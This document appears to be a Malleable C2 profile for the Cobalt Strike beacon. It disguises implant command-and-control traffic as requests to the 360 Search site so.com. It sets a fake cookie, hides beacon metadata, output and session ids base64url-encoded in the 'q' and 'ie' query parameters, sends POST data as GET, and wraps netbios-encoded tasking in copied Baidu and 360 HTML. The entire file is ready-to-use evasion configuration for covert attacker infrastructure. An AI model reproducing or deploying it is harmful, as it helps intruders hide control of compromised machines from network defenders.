http-get {

    set uri "/s";

    client {

        header "Host" "www.so.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "QiHooGUID=2DCCBBFB6D4C483DCE63343C3F72F312.1562548893039;"; 
        
        metadata {
            base64url;
            parameter "q";
        }

        parameter "ie" "utf-8";

    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "openresty/1.11.2.5";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><!--STATUS OK--><html><head><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><meta content=\"always\" name=\"referrer\"><meta name=\"theme-color\" content=\"#2932e1\"><link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" /><link rel=\"icon\" sizes=\"any\" mask href=\"//www.baidu.com/img/baidu_85beaf5496f291521eb75ba38eacbd87.svg\">";
            append "href=http://www.baidu.com/link";
            print;
        }
    }
}

http-post {
    
    set uri "/S";
    set verb "GET";

    client {

        header "Host" "www.so.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "QiHooGUID=2DCCBBFB6D4C483DCE63343C3F72F312.1562548893039;"; 
        
        output {
            base64url;
            parameter "q";
        }
        
        
        id {
            base64url;
            parameter "ie";
        }
    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "openresty/1.11.2.5";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><head><meta charset=\"utf-8\"><meta content=\"always\" name=\"referrer\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"><title>360搜索</title><link rel=\"dns-prefetch\" href=\"//p.ssl.qhimg.com\"><link rel=\"dns-prefetch\" href=\"//s.ssl.qhimg.com\"><link rel=\"dns-prefetch\" href=\"//s.ssl.qhres.com\"><link rel=\"dns-prefetch\" href=\"//p418.ssl.qhimgs4.com\"><link rel=\"dns-prefetch\" href=\"//p419.ssl.qhimgs4.com\"><link rel=\"dns-prefetch\" href=\"//p420.ssl.qhimgs4.com\"><link rel=\"shortcut icon\" href=\"https://s.ssl.qhres.com/static/52166db8c450f68d.ico\" type=\"image/x-icon\">";
            append "href=http://www.baidu.com/link";
            print;
        }
    }
}


http-stager {
    server {
        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "openresty/1.11.2.5";
        header "Connection" "close";
    }
}